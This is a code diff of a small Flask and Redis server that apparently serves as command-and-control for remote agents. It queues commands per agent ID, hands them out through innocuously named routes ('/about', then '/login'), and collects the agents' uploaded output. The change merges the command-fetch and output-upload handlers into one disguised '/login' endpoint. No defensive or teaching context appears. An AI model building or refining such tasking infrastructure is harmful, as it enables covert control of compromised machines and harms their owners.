@@ -10,12 +10,12 @@ def send_command():
     data = request.json
     if request.method == 'POST':
         uuid = data.get('uuid')
-        command = data.get('command')
-        r.rpush(uuid, command)
+        cmd = data.get('command')
+        r.rpush(uuid, cmd)
     return "Command Sent!"
 
-@app.route('/about', methods=['GET'])
-def get_command():
+@app.route('/login', methods=['GET', 'POST'])
+def commander():
     if request.method == 'GET':
         uuid = request.args.get('uuid')
         cache = r.lindex(uuid, -1)
@@ -33,11 +33,9 @@ def get_command():
                 r.lrem("agents", 0, uuid)
                 r.delete(uuid)
                 r.delete(f"{uuid}-output")
-    return command
+        return command
 
-@app.route('/login', methods=['POST'])
-def get_output():
-    if request.method == 'POST':
+    elif request.method == 'POST':
         uuid = request.args.get('uuid')
         data = request.data.decode('utf-8')
         if uuid and data:
@@ -45,10 +43,9 @@ def get_output():
             r.lpush(key, data)
         else:
             return "ERROR: POST requests only!"
+        return "Success"
     else:
-        print("Request type or header error!!\n")
-        return "ERROR!!"
-    return "Success"
+        return "Invalid Method"
 
 # This allows you to run the app directly with `python app.py`
 if __name__ == '__main__':
